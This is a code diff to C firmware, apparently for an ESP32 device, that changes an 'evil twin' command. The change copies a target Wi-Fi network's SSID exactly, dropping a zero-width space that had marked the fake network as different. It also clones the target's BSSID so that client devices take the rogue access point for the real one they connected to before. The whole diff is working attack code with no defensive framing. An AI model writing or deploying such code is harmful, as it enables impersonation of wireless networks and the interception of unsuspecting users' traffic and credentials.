@@ -7177,25 +7177,30 @@ static int cmd_start_evil_twin(int argc, char **argv) {
                 }
             };
             
-            // Copy original SSID and add Zero Width Space (U+200B) at the end
-            // This prevents iPhone from grouping original and twin networks together
+            // Copy original SSID exactly (no zero-width space — we want
+            // the client to see our AP as the same network it remembers)
             size_t ssid_len = strlen(evilTwinSSID);
-            if (ssid_len + 3 <= sizeof(ap_config.ap.ssid)) {
-                // Copy original SSID
-                strncpy((char*)ap_config.ap.ssid, evilTwinSSID, sizeof(ap_config.ap.ssid));
-                // Add Zero Width Space (UTF-8: 0xE2 0x80 0x8B)
-                ap_config.ap.ssid[ssid_len] = 0xE2;
-                ap_config.ap.ssid[ssid_len + 1] = 0x80;
-                ap_config.ap.ssid[ssid_len + 2] = 0x8B;
-                ap_config.ap.ssid_len = ssid_len + 3;
-            } else {
-                // SSID too long, just copy without Zero Width Space
-                strncpy((char*)ap_config.ap.ssid, evilTwinSSID, sizeof(ap_config.ap.ssid));
-                ap_config.ap.ssid_len = strlen(evilTwinSSID);
-            }
-            
+            strncpy((char*)ap_config.ap.ssid, evilTwinSSID, sizeof(ap_config.ap.ssid));
+            ap_config.ap.ssid_len = ssid_len;
+
             // AP mode was enabled by ensure_ap_mode(), update the configuration
             ret = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+
+            // Clone the BSSID of the target network so clients recognize
+            // this AP as the same access point they were connected to.
+            {
+                int target_idx = g_selected_indices[0];
+                uint8_t *target_bssid = g_scan_results[target_idx].bssid;
+                esp_err_t mac_ret = esp_wifi_set_mac(WIFI_IF_AP, target_bssid);
+                if (mac_ret == ESP_OK) {
+                    MY_LOG_INFO(TAG, "AP MAC cloned to %02X:%02X:%02X:%02X:%02X:%02X",
+                               target_bssid[0], target_bssid[1], target_bssid[2],
+                               target_bssid[3], target_bssid[4], target_bssid[5]);
+                } else {
+                    MY_LOG_INFO(TAG, "Failed to clone AP MAC: %s (using default)",
+                               esp_err_to_name(mac_ret));
+                }
+            }
             if (ret != ESP_OK) {
                 MY_LOG_INFO(TAG, "Failed to set AP config: %s", esp_err_to_name(ret));
                 applicationState = IDLE;
